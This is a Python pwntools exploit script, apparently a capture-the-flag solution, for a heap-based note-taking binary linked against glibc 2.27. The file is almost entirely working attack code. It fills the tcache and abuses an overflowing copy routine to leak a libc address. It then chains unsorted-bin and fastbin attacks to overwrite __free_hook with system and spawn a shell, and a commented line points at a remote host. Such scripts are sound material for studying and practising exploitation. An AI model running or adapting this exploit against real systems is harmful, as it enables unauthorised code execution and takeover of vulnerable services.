#!/usr/bin/python3
from pwn import *

def create(size):
    print('create')
    sleep(0.1)
    r.sendlineafter('Your choice: ', str(1))
    sleep(0.1)
    r.sendlineafter('size: ', str(size))

def edit(idx, context, sendline=True):
    print('edit')
    sleep(0.1)
    r.sendlineafter('Your choice: ', str(2))
    sleep(0.1)
    r.sendlineafter('idx: ', str(idx))
    sleep(0.1)
    if sendline:
        r.sendlineafter('context: ', context)
    else:
        r.sendafter('context: ', context)

def show(idx):
    print('show')
    sleep(0.1)
    r.sendlineafter('Your choice: ', str(3))
    sleep(0.1)
    r.sendlineafter('idx: ', str(idx))

def copy(srcIdx, desIdx):
    print('copy')
    sleep(0.1)
    r.sendlineafter('Your choice: ', str(4))
    sleep(0.1)
    r.sendlineafter('idx: ', str(srcIdx))
    sleep(0.1)
    r.sendlineafter('idx: ', str(desIdx))

def delete(idx):
    print('idx')
    sleep(0.1)
    r.sendlineafter('Your choice: ', str(5))
    sleep(0.1)
    r.sendlineafter('idx: ', str(idx))

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

r = process('./note')
# r = remote('34.82.101.212', 10001)
libc = ELF('./libc-2.27.so')

# Fill Tcache
for _ in range(7):
    create(0xa0)
    create(0x60)
    create(0x10)
    create(0x30)
    delete(0)
    delete(1)
    delete(2)
    delete(3)

create(0x10) # 0
create(0xa0) # 1
create(0x10) # 2, prevent 0xa0 to be merged by top chunk
create(0x400) # 3
edit(1, b'a'*(0xa0-1), sendline=False)
edit(3, b'b'*(0x400-1), sendline=False)

# Write length 0x400-1 to idx 0 & 2
# It actually only holds 0x10 bytes, leading to memory leak
copy(3, 0)
copy(3, 2)

# Make unsortbin
delete(1)

# Leak libc
show(0)
r.recv(0x10) # 'a' from copy(1, 0)
r.recv(0x10) # next chunk's head
libc.address = u64(r.recv(0x8)) - 0x3ebca0 # fd
print('libc: {:#x}'.format(libc.address))

create(0x60) # 1
delete(1)

fd = libc.symbols['__free_hook'] - 0x63
bk = libc.symbols['__free_hook'] - 0x70
payload = b'c'*0x10 + \
        p64(0) + p64(0x71) + \
        p64(fd) + p64(0) + \
        b'd'*0x50 + \
        p64(0x0) + p64(0x41) + \
        p64(0x0) + p64(bk)

edit(0, payload)

create(0x30) # 1, Attack unsortbin

create(0x60) # 4, Attack fastbin
create(0x60) # 5

# write system to __free_hook
payload = b'\0' * 0x53 + p64(libc.symbols['system'])
edit(5, payload)

edit(3, b'/bin/sh\x00')

delete(3)

r.interactive()


